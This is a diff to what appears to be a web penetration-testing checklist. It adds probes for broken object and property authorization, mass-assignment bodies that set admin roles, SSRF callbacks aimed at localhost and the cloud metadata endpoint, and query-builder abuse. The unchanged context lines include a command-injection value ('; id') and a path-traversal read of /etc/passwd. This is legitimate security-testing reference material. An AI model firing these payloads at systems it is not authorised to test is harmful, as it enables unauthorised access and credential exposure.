@@ -29,10 +29,88 @@ Input tracing checklist:
 
 - SQLi: `'`, true/false, time delay.
 - XSS: `<b>test</b>`, then context payload.
+- AuthZ: change object IDs, role fields, tenant fields.
+- Mass assignment: send hidden JSON fields.
 - CMDi: `; id`, then time delay.
 - SSTI: `{{7*7}}`.
 - LFI: `../../../etc/passwd`.
 - SSRF: callback URL.
+
+---
+
+## 🔴 Modern Detection Payloads
+
+Modern apps often fail before classic injection does. Test these early:
+
+### Object-Level Authorization
+
+```http
+GET /api/orders/1001
+GET /api/orders/1002
+
+GET /api/users/me
+GET /api/users/2
+```
+
+Signal:
+
+- same token
+- different object ID
+- successful access or different data shape
+
+### Property-Level Authorization
+
+```http
+GET /api/profile?fields=id,email,role,isAdmin,tenantId
+```
+
+Signal:
+
+- response includes fields the UI does not display
+
+### Mass Assignment / Over-Posting
+
+```json
+{"displayName":"test","role":"admin"}
+{"email":"user@corp.test","isAdmin":true}
+{"plan":"enterprise","tenantId":1}
+{"status":"approved"}
+```
+
+Signal:
+
+- server accepts unexpected fields
+- role or ownership changes
+- hidden state transitions succeed
+
+### Webhook / Callback SSRF
+
+```json
+{"url":"http://127.0.0.1:80"}
+{"url":"http://169.254.169.254/latest/meta-data/"}
+{"url":"http://localhost/admin"}
+```
+
+Signal:
+
+- callback accepted
+- timing changes
+- validation errors disclose fetch behavior
+
+### Sort / Filter / Query Builder Abuse
+
+```http
+GET /api/users?sort=role
+GET /api/users?sort=createdAt:desc
+GET /api/users?filter[role]=admin
+GET /api/search?q=test&order=price
+```
+
+Signal:
+
+- backend exposes internal field names
+- unauthorized records become visible
+- malformed sort/filter causes ORM or SQL errors
 
 ---
 
